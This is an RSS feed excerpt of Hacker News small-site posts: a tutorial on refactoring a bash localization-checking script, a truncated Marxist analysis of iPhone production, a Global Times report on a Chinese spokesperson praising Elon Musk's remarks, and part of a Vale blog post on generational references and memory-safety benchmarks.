<p>The product I’m working on has a list of “Alarms”—conditions that the end user needs to be alerted to. We also have a localization file for each supported language that maps Alarm names to human-readable names, descriptions, etc. There are a lot of alarms, enough to make it difficult to keep track of which ones are already translated. This calls for a script!</p>

<p>The Alarms file looks something like this:</p>

<div><div><pre><code><span>&lt;!-- Alarms.xml --&gt;</span>
<span>&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span>&lt;config</span> <span>name=</span><span>"AlarmConfig"</span><span>&gt;</span>
   <span>&lt;AlarmList</span> <span>name=</span><span>"IngredientAlarms"</span> <span>version=</span><span>"1.0"</span><span>&gt;</span>
      <span>&lt;Alarm</span> <span>name=</span><span>"MozzarellaTooWarm"</span><span>&gt;</span>
        <span>&lt;!-- some alarm-specific stuff here --&gt;</span>
      <span>&lt;/Alarm&gt;</span>
      <span>&lt;Alarm</span> <span>name=</span><span>"PizzaTooCold"</span><span>&gt;</span>
      <span>&lt;/Alarm&gt;</span>
      <span>&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<p>And the localization something like this:</p>

<!-- prettier-ignore -->
<div><div><pre><code><span>[{</span> <span>stringId</span><span>:</span> <span>"</span><span>alarm_id_MozzarellaTooWarm</span><span>"</span><span>,</span>
   <span>localString</span><span>:</span> <span>"</span><span>MozzarellaTooWarm</span><span>"</span> <span>},</span>
 <span>{</span> <span>stringId</span><span>:</span> <span>"</span><span>alarm_title_MozzarellaTooWarm</span><span>"</span><span>,</span>
   <span>localString</span><span>:</span> <span>"</span><span>Mozzarella Too Warm</span><span>"</span> <span>},</span>
 <span>{</span> <span>stringId</span><span>:</span> <span>"</span><span>alarm_description_MozzarellaTooWarm</span><span>"</span><span>,</span>
   <span>localString</span><span>:</span> <span>"</span><span>The mozzarella has become too warm and must be used within the next five minutes</span><span>"</span> <span>},</span>
  <span>//...</span>
<span>]</span>
</code></pre></div></div>

<h3 id="make-a-plan">Make a plan</h3>

<ol>
  <li>Extract the alarms names from Alarms.xml using <code>xpath</code>.</li>
  <li>Each alarm needs to be prefixed with <code>alarm_id_</code>, <code>alarm_title_</code>, <code>alarm_description_</code>, <code>alarm_operator_actions_</code> in order to match the localization file. Figure out some way to do that.</li>
  <li>Extract the <code>"stringId"</code> from each entry in the localization file. Oh, but there are other entries for things that need to be localized, and aren’t alarms at all. Figure out a way to filter those out. Probably use <code>jq</code> for that.</li>
  <li>Use <code>diff</code> to compare the expected keys with the actual keys.</li>
</ol>

<p>This isn’t a post on how to make bash pipelines, so I’ll gloss over that piece. Here’s what I came up with:</p>

<div><div><pre><code>diff <span>\</span>
  &lt;<span>(</span><span>join</span> <span>-j</span> 99999 <span>\</span>
    &lt;<span>(</span><span>echo</span> <span>'alarm_id_
alarm_title_
alarm_description_
alarm_operator_actions_'</span><span>)</span> <span>\</span>
    &lt;<span>(</span>xpath <span>-q</span> <span>-e</span> config/AlarmList/Alarm/@name Alarms.xml |
      <span>cut</span> <span>-d</span><span>=</span> <span>-f2</span> | <span>tr</span> <span>-d</span> <span>'"'</span><span>)</span> <span>\</span>
    | <span>tr</span> <span>-d</span> <span>' '</span> | <span>sort</span><span>)</span> <span>\</span>
  &lt;<span>(</span>jq <span>'.[] | select(.stringId | startswith("alarm_")) |
        .stringId '</span> i18n/en.json | <span>sort</span><span>)</span>
</code></pre></div></div>

<p>It’s convoluted and kinda impressive in that way. But not code you’d be happy to maintain.</p>

<h3 id="one-step-at-a-time">One step at a time</h3>

<p>The prior step accomplished what we needed, but it was pretty difficult to see what was going on. In my opinion, that’s because</p>

<ul>
  <li>Nothing has a name. Because each process substitution is fed directly into a parent, nothing ever receives a name. We need to name our intermediates!</li>
  <li>No comments. It’s difficult to add comments because every line ends in a backslash, meaning “continue this line as if I hadn’t pressed enter”. Bash doesn’t allow you to say “continue this line” and also add a comment.</li>
</ul>

<p>Let’s see if we can tease out each part using intermediate files.</p>

<div><div><pre><code><span>cat</span> <span>&gt;</span> alarm_attrs <span>&lt;&lt;</span> <span>EOF</span><span>
alarm_id_
alarm_title_
alarm_description_
alarm_operator_actions_
</span><span>EOF

</span>xpath <span>-q</span> <span>-e</span> config/AlarmList/Alarm/@name Alarms.xml |
  <span>cut</span> <span>-d</span><span>=</span> <span>-f2</span> | <span>tr</span> <span>-d</span> <span>'"'</span> <span>&gt;</span> expected_alarm_names

<span>join</span> <span>-j</span> 999 alarm_attrs expected_alarm_names |
  <span>tr</span> <span>-d</span> <span>' '</span> | <span>sort</span> <span>&gt;</span> expected_localization_keys

jq <span>-r</span> <span>'.[] | select(.stringId | startswith("alarm_")) |
       .stringId'</span> en.json | <span>sort</span> <span>&gt;</span> actual_localization_keys
</code></pre></div></div>

<p>This is better! Each piece can be understood in isolation, and the dependencies between steps are explictly tracked with named files. All that’s left is to add comments and some error checking, and clean up our intermediate files.</p>

<p>Cleaning up after ourselves is a little tricky. Ideally, we’d like to avoid leaving the intermediate results files laying around regardless of whether the script exits normally, crashes, or is cancelled with ctrl-c. We can use <code>trap</code> to handle this. <code>trap</code> sets up a command to run when a “signal” occurs. We’ll put all our intermediate files into a directory and use <code>trap</code> to delete that directory when a signal that indicates our script is ending fires.</p>

<div><div><pre><code><span>#!/bin/bash</span>

<span>set</span> <span>-ef</span> <span>-o</span> pipefail

<span>readonly </span><span>script_name</span><span>=</span><span>`</span><span>basename</span> <span>"</span><span>$0</span><span>"</span><span>`</span>
usage<span>()</span> <span>{</span>
  <span>cat</span> <span>&gt;</span>&amp;2 <span>&lt;&lt;</span> <span>EOF</span><span>
Usage: </span><span>$script_name</span><span> &lt;path-to-Alarms.xml&gt; &lt;path-to-en.json&gt;

  Compare the alarms specified in Alarms.xml against the
  localizations keys provided in a [language-code].json file
  (eg, en.json). Warn if any keys are missing or unexpected.
</span><span>EOF
</span>  <span>exit </span>2
<span>}</span>

<span>if</span> <span>[[</span> <span>$# </span><span>!=</span> 2 <span>]]</span><span>;</span> <span>then
   </span><span>echo</span> <span>"error: expected 2 arguments, received $#"</span> 1&gt;&amp;2
   usage
<span>fi

</span><span>readonly </span><span>ALARM_CONFIG_XML</span><span>=</span><span>$1</span>
<span>if</span> <span>[[</span> <span>${</span><span>ALARM_CONFIG_XML</span>:<span> -4</span><span>}</span> <span>!=</span> <span>".xml"</span> <span>||</span> <span>!</span> <span>-e</span> <span>$ALARM_CONFIG_XML</span> <span>]]</span><span>;</span> <span>then
   </span><span>echo</span> <span>"error: unable to find XML file at </span><span>$ALARM_CONFIG_XML</span><span>"</span> 1&gt;&amp;2
   usage
<span>fi
</span><span>readonly </span><span>LOCALIZATION_JSON</span><span>=</span><span>$2</span>
<span>if</span> <span>[[</span> <span>${</span><span>LOCALIZATION_JSON</span>:<span> -5</span><span>}</span> <span>!=</span> <span>".json"</span> <span>||</span> <span>!</span> <span>-e</span> <span>$LOCALIZATION_JSON</span> <span>]]</span><span>;</span> <span>then
   </span><span>echo</span> <span>"error: unable to find JSON file at </span><span>$LOCALIZATION_JSON</span><span>"</span> 1&gt;&amp;2
   usage
<span>fi</span>

<span># Make a directory for intermediate results</span>
<span>tmpdir</span><span>=</span><span>$(</span><span>mktemp</span> <span>-d</span> <span>-p</span> .<span>)</span>
<span># ensure it's removed when this script exits</span>
<span>trap</span> <span>"rm -rf </span><span>$tmpdir</span><span>"</span> EXIT HUP INT TERM
<span># note: when debugging, turn off that `trap` line to keep</span>
<span># intermediate results around</span>

<span># The plan is ultimately to use diff to compare names between</span>
<span># Alarms.xml and en.json. diff will tell us if any names</span>
<span># appear in one file but are missing in the other (checks</span>
<span># both directions for a mismatch).In pursuit of this, we need</span>
<span># to create a couple of temporary files:</span>
<span>#  1) all the alarm names we expect to find (based on Alarms.xml)</span>
<span>#  2) all the names actually present in the localization file.</span>
<span># A complication: the location file uses a flat format to</span>
<span># store the id, title, description, and operator_actions:</span>
<span>#   { "stringId": "alarm_id_MozzarellaTooWarm", ... },</span>
<span>#   { "stringId": "alarm_title_MozzarellaTooWarm", ... },</span>
<span>#   { "stringId": "alarm_description_MozzarellaTooWarm", ... },</span>
<span>#   { "stringId": "alarm_operator_actions_MozzarellaTooWarm", ... },</span>
<span># We want to check that *all* of these keys are present, so</span>
<span># we use a cross product of (alarm names) X (those attributes)</span>

<span>cat</span> <span>&gt;</span> <span>$tmpdir</span>/alarm_attrs <span>&lt;&lt;</span> <span>EOF</span><span>
alarm_id_
alarm_title_
alarm_description_
alarm_operator_actions_
</span><span>EOF

</span>xpath <span>-q</span> <span>-e</span> config/AlarmList/Alarm/@name <span>$ALARM_CONFIG_XML</span> |
 <span>cut</span> <span>-d</span><span>=</span> <span>-f2</span> | <span>tr</span> <span>-d</span> <span>'"'</span> <span>&gt;</span> <span>$tmpdir</span>/expected_alarm_names

<span># trick to compute cross product: use `join` with a join</span>
<span># field that doesn't exist (999). since both files lack a</span>
<span># field at 999, they will compare equal for every key, and</span>
<span># each line of the left file will be joined with each line</span>
<span># of the right file--a cross product.</span>
<span>join</span> <span>-j</span> 999 <span>$tmpdir</span>/alarm_attrs <span>$tmpdir</span>/expected_alarm_names |
<span>tr</span> <span>-d</span> <span>' '</span> | <span>sort</span> <span>&gt;</span> <span>$tmpdir</span>/expected_localization_keys

jq <span>-r</span> <span>'.[] | select(.stringId | startswith("alarm_")) |
       .stringId'</span> <span>$LOCALIZATION_JSON</span> |
  <span>sort</span> <span>&gt;</span> <span>$tmpdir</span>/actual_localization_keys

<span>if </span>diff <span>$tmpdir</span>/expected_localization_keys <span>$tmpdir</span>/actual_localization_keys<span>;</span> <span>then
   </span><span>echo</span> <span>"Success! Found all"</span> <span>$(</span><span>wc</span> <span>-l</span> <span>$tmpdir</span>/expected_localization_keys<span>)</span> <span>"expected localization keys"</span>  1&gt;&amp;2
<span>else
   </span><span>echo</span> <span>"Failure. Found discrepancies between expected alarm names and actual localization keys"</span> 1&gt;&amp;2
   <span>exit </span>1
<span>fi</span>
</code></pre></div></div>

        </article>

        
        
        
        

      </div>
    </div></div>]]>
            </description>
            <link>https://brianschiller.com/blog/2021/01/07/readable-bash-scripts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25702062</guid>
            <pubDate>Sat, 09 Jan 2021 17:03:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Marxist Analysis of the iPhone (2019)]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25702019">thread link</a>) | @moigagoo
<br/>
January 9, 2021 | http://www.socialisteconomist.com/2019/09/a-marxist-analysis-of-iphone.html | <a href="https://web.archive.org/web/*/http://www.socialisteconomist.com/2019/09/a-marxist-analysis-of-iphone.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span><b>Workers who make iPhones in the 21st century</b>, are twenty-five times more exploited than textile workers in England in the 19th century. Based on a marxist analysis, the current&nbsp;<i>rate of exploitation </i>is&nbsp;2458%.</span></p><div>
<p><span><span><b>W</b></span></span>e are interested in looking at the production
of the iPhone – a commodity – through the
framework of a Marxist analysis. We are interested not in being angry at Apple and Foxconn
alone, but in being able to measure how much
workers are exploited to produce this commodity. In other words, we are interested in measuring <b>the rate of exploitation</b>.</p><p>

The rate of exploitation is one of the most
important concepts in Marx’s theory. This
measurement allows us to show how much the
worker contributes to the increase of value in
the production process. It shows that even if the
worker is paid more, by the special magic of
mechanisation and of efficient management of
the production process, the rate of exploitation
increases. The rate expresses quantitatively the
contradictory interests of the capitalists and of
the workers. There is a radical politics implicit in
the analysis of the rate of exploitation. It enables workers to see how much of the share of
the value produced is appropriated from them
by the capitalists, and to therefore make the
case for a different way to organise production
and to end exploitation.</p><p>

To understand the rate of exploitation, we have
to first grasp what Marx means by the commodity itself and what he means by value, a key term
in the Marxist system of economic thought.</p><p><a href="https://1.bp.blogspot.com/-C5uknsT1Qo8/XZCEHtKcdVI/AAAAAAAAFRU/ske4yAP-_xY8lyclVj_QI14X31w008uqQCLcBGAsYHQ/s1600/book2.png" imageanchor="1"><img data-original-height="536" data-original-width="542" height="316" src="https://1.bp.blogspot.com/-C5uknsT1Qo8/XZCEHtKcdVI/AAAAAAAAFRU/ske4yAP-_xY8lyclVj_QI14X31w008uqQCLcBGAsYHQ/s320/book2.png" width="320"></a></p>
<p>
What is a commodity? Marx begins his epic
work Capital (1867) with a discussion of the
commodity. ‘A commodity’, he notes, ‘is an object outside us, a thing that by its properties
satisfies human wants of some sort or another.
The nature of such wants, whether, for instance,
they spring from the stomach or from fancy,
makes no difference. Neither are we concerned
to know how the object satisfies these wants,
whether directly as a means of subsistence, or
indirectly as means of production’. The commodity is a useful object. But it is more than a
useful thing that serves a purpose to a consumer. It is also something that can be sold – something that enables the person who has it made
to realise a profit. Inside the commodity, then, is
both <b>use value</b> and <b>value</b>.</p><p>

The use value of the commodity is merely its
utility, something that is left to the consumer.
An iPhone is a good example, because it can
be used for many things: to make a phone call,
to watch a video, to use as a compass, to hold
onto when you are feeling awkward (or even to
improve your image).</p><p><a href="https://1.bp.blogspot.com/-XSTB0AJ3dE8/XZCEcFG4l8I/AAAAAAAAFRc/zQgbE9cGZ20opRyyiarpiQQVm8vlXer2QCLcBGAsYHQ/s1600/values.png" imageanchor="1"><img data-original-height="595" data-original-width="465" src="https://1.bp.blogspot.com/-XSTB0AJ3dE8/XZCEcFG4l8I/AAAAAAAAFRc/zQgbE9cGZ20opRyyiarpiQQVm8vlXer2QCLcBGAsYHQ/s1600/values.png"></a></p>
<p>
The expression of the value of the commodity
(i.e. exchange value) is the price of the commodity. We are aware that there is a rich and
long debate amongst Marxists over the relationship between prices and the value of a
commodity. This debate is known as the transformation problem – namely the problem of the
transformation of values to prices of production. Nevertheless, for our iPhone example, we
believe that this level of concreteness need not
detain us. We are still able to capture something
significant. In the case of the iPhone X, the expression of its value is $999. The value is merely
what the commodity is able to command in
the market. But behind that price is a mass of
crystallised values, which can be grouped into
three parts of the total value: <b>constant capital</b>,
<b>variable capital,</b> and <b>surplus value</b>. These are
key concepts for Marxist analysis.</p><p>

<b><span>Constant capital</span></b></p><p>

Various raw materials are brought on to the
factory floor that are to be transformed by the
actions of labour and machines into commodities. These raw materials – and other auxiliary
materials, including the instruments of labour
(machines, tools, etc.) – have already been
fashioned from nature elsewhere. Inside these
raw materials, which are not really ‘raw’ any
longer, is embodied labour. The values of the
various raw materials and instruments of labour
are quantitatively fixed in terms of their labour
content. This fixed amount of value is now
transferred to the newly produced commodities
in the process of production. Its value enters
into the new commodities. Karl Marx calls the
values of the raw materials and the instruments
of labour <b>constant capital</b>.</p><p>

The constant capital for the iPhone includes
all of those minerals and metals that appear on the assembly line as well as the depreciated
parts of machines that work those raw materials.
These are then collectively transformed into
the iPhone. In the process of transformation,
the minerals, metals, and machines do not
alter their value. Their value is preserved in the
iPhone. The value remains constant.</p><p>

At the end of the process of production, the
total transferred value of those means of production – the raw materials, the machines, the
buildings – cannot be more than what they
originally contained in themselves. Their value,
which remains constant, is preserved in the
iPhone.</p><p><a href="https://1.bp.blogspot.com/-Q_pB4fCgz5I/XZCFCPeC69I/AAAAAAAAFRo/PocXIl65lesBDVnMU7IPnoRo6THryPOjwCLcBGAsYHQ/s1600/capital.png" imageanchor="1"><img data-original-height="579" data-original-width="378" src="https://1.bp.blogspot.com/-Q_pB4fCgz5I/XZCFCPeC69I/AAAAAAAAFRo/PocXIl65lesBDVnMU7IPnoRo6THryPOjwCLcBGAsYHQ/s1600/capital.png"></a></p>
<p>

<b><span>Variable capital.</span></b></p><p>

The capitalist firm makes an initial investment in
the production process:</p><ul>
<li>Wages and salaries for workers.</li>
<li>Expenses on all non-human inputs, notably
tools, machinery, buildings, energy, and so
on.</li>
</ul><p>
The latter expense – the expense on all non-human inputs – is known as <b>constant capital</b>, as
explained above.</p><p>

The former expense – the expense on wages
and salaries – is known as variable capital.
To simplify our calculation, we assume that all
workers are productive in the Marxist sense
(namely, that they produce surplus value and
do not merely distribute surplus value – as do
‘unproductive’ workers, such as those who are
involved in trade).</p><p>

In the capitalist system, people are ‘free’ in two
ways. They are free from bondage and free to
starve. The freedom from bondage and from
the means to feed themselves forces people to sell their capacity to labour to those with capital
(land or money). What the person sells is not
themselves (since they are free from bondage),
but they sell their labour power in exchange
for wages. The wages correspond to a certain
amount of money – representing a certain
amount of value – that is necessary to satisfy the
consumption needs of the workers.</p><p>

Marx called labour power <i>a peculiar commodity</i>. Like other commodities, this one must have
two aspects – a use value and a value. Wages
are the <b>exchange value</b> of labour power,
whereas labour is the use value of labour power. This distinction between the use value of
labour power and the exchange value of labour
power is fundamental to a Marxist understanding of surplus value and its production.</p><p>

In a given working day, workers transform
their capacity to labour into an act of labour.
Their various skills are utilised to transform raw materials and machines into commodities.</p><blockquote>
 Workers produce more value than they are paid in wages. This extra value is called&nbsp;<b>surplus value</b>.</blockquote><p>
During the working day and given the conditions of work, the total amount of value produced by the workers exceeds what is needed
for their own consumption and reproduction.
The value they require for their consumption
and reproduction – represented in wages – is
only a part of the value that they make during
the working day.</p><p>

Workers produce more value than they are
paid in wages. This extra value is called
<b>surplus value</b>. If the management of labour
changes or if the machines work at a different
speed, then either more or less value is produced in a day, which means that the surplus
value can be increased (or decreased). The fact
that labour power – this peculiar commodity –
has the quality of producing an extra amount of
value than what is needed for its own reproduction makes it <b>variable capital</b>.</p><p>

<b><span>Surplus Value</span></b></p><p>

The various raw materials that are on the assembly line, the machines, and the electricity that
help fashion the raw materials, would all be idle
without the necessary work of the labour power
put into the system by the workers. The workers
take the raw materials and the tools and shape
them into a commodity. It is the input of the
labour power that is crucial. Unlike any other
commodity, the labour power purchased from
the worker has to produce these new values.
When the workers tire, they go home and reproduce their labour power to be sold again.</p><p><a href="https://1.bp.blogspot.com/-JPwsXDRUiDU/XZCFarXi6jI/AAAAAAAAFRw/luib4DD_tPkBGGIdJ0FOfSFmS-HNhJOmACLcBGAsYHQ/s1600/SV.png" imageanchor="1"><img data-original-height="595" data-original-width="566" src="https://1.bp.blogspot.com/-JPwsXDRUiDU/XZCFarXi6jI/AAAAAAAAFRw/luib4DD_tPkBGGIdJ0FOfSFmS-HNhJOmACLcBGAsYHQ/s1600/SV.png"></a></p>
<p>
The workers sell their labour power for a set
amount of money. When they start to work on
the production of commodities, it takes them
only a fraction of their working day to make
enough commodities to cover their own wages.
Marx called that the <b>necessary labour time</b>. It
was ‘necessary’ because in different epochs and in different countries it takes different amounts
of goods and services to reproduce the worker’s depleted labour power. In some countries,
the standard of living is lower than that of
others, which means the necessary labour time
is also shorter. The remainder of the working
day – after the necessary labour time – is the
<b>surplus labour time</b>. It is the time that the
worker spends producing commodities that are
above and beyond the amount needed to be
produced to pay the wage bill of the worker.</p><p>

<b><span>Rate of Surplus Value</span></b></p><p>

Marx’s concept – the rate of exploitation – is
measured by using the categories of variable
capital and surplus value. Variable capital is
the share of the values produced in the process of production that goes to the workers.
Surplus value, on the other hand, is the share
of the values that goes to the capitalist. The ratio of surplus value to variable capital – or
s/v – can be seen as a quantitative expression
of the exploitation of workers, also called the
<b>rate of surplus value</b>.</p><p>

Take a hypothetical commodity whose total
value is $1,000. The constant capital is worth
$500. That capital – raw material, tools and energy – goes into the process of production and
remerges in a different form but with the value
intact. There is no change in its value. The variable capital – what the worker earns – is $250.
The surplus value – what the capitalist appropriates – is the amount of value created during
the surplus labour time, which in …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.socialisteconomist.com/2019/09/a-marxist-analysis-of-iphone.html">http://www.socialisteconomist.com/2019/09/a-marxist-analysis-of-iphone.html</a></em></p>]]>
            </description>
            <link>http://www.socialisteconomist.com/2019/09/a-marxist-analysis-of-iphone.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25702019</guid>
            <pubDate>Sat, 09 Jan 2021 16:59:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chinese FM welcomes Elon Musk statement praising Chinese government]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25701603">thread link</a>) | @jimmy2020
<br/>
January 9, 2021 | https://www.globaltimes.cn/page/202101/1212242.shtml#.X_nTsdClAgQ.twitter | <a href="https://web.archive.org/web/*/https://www.globaltimes.cn/page/202101/1212242.shtml#.X_nTsdClAgQ.twitter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          
          <p>Elon Musk's praise of China's government for being 'very responsible' to its people's needs and happiness is objective: Chinese FM</p>
          
          
        </div><div>
          <div> <center><img src="https://www.globaltimes.cn/Portals/0/attachment/2021/2021-01-08/acc29ac0-e6f1-4707-acc9-d248a6631a80.jpeg"></center>
<p>Elon Musk. Photo: VCG</p><p>Chinese FM said the praise from Elon Musk to China's government for being "very responsible" to its people's needs and happiness is objective, and it is a conclusion that reflects the real situation, adding that China welcomes more foreign friends to visit and get a comprehensive, correct impression of the nation.&nbsp;</p><p>The remarks came after Elon Musk hailed China as "more responsible" than the US in an interview with Business Insider, according to express.co.uk on January 4.&nbsp;</p><p>Musk said he had a positive experience when talking to Chinese government officials during his visits to the country and said they could "possibly" be "more responsible" to their people's happiness than the US.</p><p>Anyone who is unbiased and hopes to understand the real China objectively will come to such a conclusion, which reflects the reality of China's development history over the past 100 years, and the rapid changes that are currently taking place across Chinese land, Hua Chunying, spokesperson of China's Foreign Ministry, said on Friday.&nbsp;&nbsp;</p><p>We welcome more foreign friends to visit China and gain an accurate impression of the country through close contact with Chinese people, she added.&nbsp;&nbsp;</p><p>Hua noted that, during the fight against the pandemic, everyone has also seen that the Chinese government insisted on putting people and their livelihoods first and spared no effort in protecting everyone's life, health, value and dignity.</p><p>We have also implemented the largest and most powerful battle against poverty in human history and successfully lifted 850 million people out of poverty, she added.</p><p>"This year, we have embarked on a new journey of building a modern socialist country in an all-round way. I think our Chinese people's growing needs or yearning for a better life will be further satisfied," Hua said.&nbsp;</p></div>
        </div></div>]]>
            </description>
            <link>https://www.globaltimes.cn/page/202101/1212242.shtml#.X_nTsdClAgQ.twitter</link>
            <guid isPermaLink="false">hacker-news-small-sites-25701603</guid>
            <pubDate>Sat, 09 Jan 2021 16:20:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generational References 2.3x faster than reference counting, unoptimized]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25701111">thread link</a>) | @harporoeder
<br/>
January 9, 2021 | https://vale.dev/blog/generational-references | <a href="https://web.archive.org/web/*/https://vale.dev/blog/generational-references">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
    <div>
  

        <div>
          <div>
  

          <div>
            
    
<p>2.3x faster than reference counting, unoptimized!</p>

              <p><span>Jan 5 2021</span> </p>
      
</div>
<section>
<p>
<b>Generational references</b> are a new memory management technique that's easy, deterministic, and <i>very</i> fast.
</p>

</section>
<section>
<p>
This technique is the first ingredient in Vale's final <a href="https://vale.dev/blog/hybrid-generational-memory">hybrid-generational memory</a> design, which is even faster. Our eventual goal is to be as fast as Rust, and perhaps even as fast as C++, while being safer than both. <a href="#note0" data-noteid="0">0</a>
</p>
<p>
This article explains how generational references work, how they compare to reference counting, and what makes it all so fast. <a href="#note1" data-noteid="1">1</a>
</p>

</section>
<section>
<h2 id="built-on-single-ownership">
 Built on Single Ownership</h2>
<p>
Recall that in Vale, an object is freed when its <b>owning reference</b> goes out of scope. An object always has exactly one owning reference pointing to it.
</p>
<p>
We can have as many <b>non-owning</b> references as we want. <a href="#note2" data-noteid="2">2</a>
</p>
<p>
In other languages, when a programmer frees an object and then accidentally dereferences a non-owning reference to it, it can cause memory unsafety and vulnerabilities. <a href="#note3" data-noteid="3">3</a>
</p>
<p>
Our goal is to detect this situation and react to it safely. <a href="#note4" data-noteid="4">4</a>
</p>

</section>
<section>
<h2 id="generational-malloc-and-the-sacred-integer">
 Generational Malloc and the Sacred Integer</h2>
<p>
Generational references use <b>generational malloc</b>, which is like regular malloc, except at the top of every allocation is a <b>generation number</b>, which tracks how many objects have previously been at this memory location.
</p>
<p>
One could also think of it as describing "I am the <b>n</b>th inhabitant of this memory location".
</p>
<p>
Freeing an object will increment its generation number. Nobody else ever modifies it.
</p>

</section>
<section>
<p>
Later on, we use this number to see if a particular object is still alive, explained further below.
</p>

</section>
<section>
<p>
Generational malloc would normally be an adjustment to mimalloc or jemalloc, but we can simulate it with our own <span>genMalloc</span> and <span>genFree</span> functions:
</p>
<ul>
<li>
<span>genFree</span> increments the generation number, and instead of calling <span>free</span> <a href="#note5" data-noteid="5">5</a><a href="#note6" data-noteid="6">6</a>, remembers the allocation in a free-list. There's a free-list for every size class (16b, 24b, 32b, &lt;=48b, &lt;=64b, &lt;=128b, etc).
</li>
<li>
<span>genMalloc</span> pulls from a free-list if possible. If it's empty, it calls <span>malloc</span> and initializes the generation number to 1.
</li>
</ul>
<p>
You can find our experimental implementation in <a href="https://github.com/ValeLang/Vale/blob/master/Midas/src/builtins/genHeap.c">genHeap.c</a>.
</p>

</section>

      </div>
  
<div>

      <nav>
      <p>Generational References</p>
    


      </nav>
      
    

      <div>
        <div>
    
<div id="note0" data-noteid="0">
<p><span>0</span></p><section>
<p>
See <a href="https://vale.dev/blog/hybrid-generational-memory">HGM</a>'s afterword for a hypothetical comparison with Rust!
</p>

</section>
</div>
<div id="note1" data-noteid="1">
<p><span>1</span></p><section>
<p>
 Vale has three release modes:
</p>
<ul>
<li>
<b>Resilient:</b> Fast and 100% safe.
</li>
<li>
<b>Assist:</b> for development, detects logic problems.
</li>
<li>
<b>Unsafe:</b> turns off all safety.
</li>
</ul>
<p>
Resilient mode uses hybrid-generational memory.
</p>

</section>
</div>
<div id="note2" data-noteid="2">
<p><span>2</span></p><section>
<p>
This distinction is similar to C++'s <span>unique_ptr&lt;T&gt;</span> and <span>T*</span>.
</p>

</section>
</div>
<div id="note3" data-noteid="3">
<p><span>3</span></p><section>
<p>
Rust partially solves this, but forces complexity on the programmer and doesn't solve the <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA problem</a>. We'd like a solution that's simpler, solves the whole problem, with as little <a href="https://vale.dev/blog/hybrid-generational-memory#afterword-how-might-it-compare-to-rust">run-time overhead as Rust</a>.
</p>

</section>
</div>
<div id="note4" data-noteid="4">
<p><span>4</span></p><section>
<p>
Such as by halting or stack unwinding.
</p>

</section>
</div>
<div id="note5" data-noteid="5">
<p><span>5</span></p><section>
<p>
 Our experimental implementation doesn't release memory back to the OS until exit, but when a page is empty, the final version will release the page back to the operating system and map its virtual memory to a read-only page containing all 0xFF.
</p>

</section>
</div>
<div id="note6" data-noteid="6">
<p><span>6</span></p><section>
<p>
 When an allocation's generation can't be incremented any more, it's not used again (at least until we can re-map the page).

</p>

</section>
</div>

        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<h2 id="generational-reference-more-than-just-a-pointer">
 Generational Reference: More than just a pointer!</h2>

</section>
<section>
<p>
Vale's references are <b>generational references</b>. A generational reference has two things:
</p>
<ul>
<li>
A pointer to the object.
</li>
<li>
A "target generation" integer.
</li>
</ul>
<p>
To create a reference to an object, we get its allocation's generation number, and include it in the reference.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<h3 id="dereferencing">
 Dereferencing</h3>

</section>
<section>
<p>
To dereference a generational reference, we do a "liveness check" to see whether the allocation's generation number <b>still matches</b> our reference's target generation. <a href="#note7" data-noteid="7">7</a>
</p>
<p>
This prevents use-after-free problems, and makes Vale completely memory safe.
</p>

</section>
<section>
<p>
It's as if the reference is saying:
</p>
<p><b>"Hello! I'm looking for the 11th inhabitant of this house, are they still around?"</b>
</p>

</section>
<section>
<p>
and the person who opens the door says:
</p>
<p><b>"No, sorry, I'm the 12th inhabitant of this house, the 11th inhabitant is no more."</b> <a href="#note8" data-noteid="8">8</a>
</p>
<p>
or instead:
</p>
<p><b>"Yes! That is me. Which of my fields would you like to access?"</b>
</p>

</section>

      </div>
  
<div>

      <div>
        <div>
    
<div id="note7" data-noteid="7">
<p><span>7</span></p><section>
<p>
 This is similar to the "generational indices" technique from C++ and Rust, but applied to the entire world instead of just a specific vector.
</p>

</section>
</div>
<div id="note8" data-noteid="8">
<p><span>8</span></p><section>
<p>
 This will safely halt the program, unless the user is explicitly checking whether something is alive (such as for a weak reference).

</p>

</section>
</div>

        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<h2 id="speed">
 Speed</h2>

</section>
<section>
<p>
Generational references are only the first steps towards hybrid-generational memory, but we decided to run some early experiments to see how it compares to existing memory models.
</p>
<p>
For this experiment, we benchmarked <a href="#note9" data-noteid="9">9</a> <a href="#note10" data-noteid="10">10</a> three flavors of Vale:
</p>
<ul>
<li>
<b>Unsafe</b>, with no memory safety, the equivalent of C++ (minus caveats, see below!)
</li>
<li>
<b>RC</b>, where we use naive reference counting for all our objects.
</li>
<li>
<b>GM</b>, which uses generational references.
</li>
</ul>

</section>
<section>
<div>
  <table>
    <thead>
      <tr>
        <th>Mode</th>
        <th>Speed&nbsp;(seconds)</th>
        <th>Overhead Compared to Unsafe (seconds)</th>
        <th>Overhead Compared to Unsafe (%)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <th>Unsafe</th>
        <td>43.82&nbsp;seconds</td>
        <td>n/a</td>
        <td>n/a</td>
      </tr>
      <tr>
        <th>RC</th>
        <td>54.90&nbsp;seconds</td>
        <td>+11.08&nbsp;seconds</td>
        <td>+25.29%</td>
      </tr>
      <tr>
        <th>GM</th>
        <td>48.57&nbsp;seconds</td>
        <td>+4.75&nbsp;seconds</td>
        <td>+10.84%</td>
      </tr>
    </tbody>
  </table>
</div>


</section>

      </div>
  
<div>

      <div>
        <div>
    
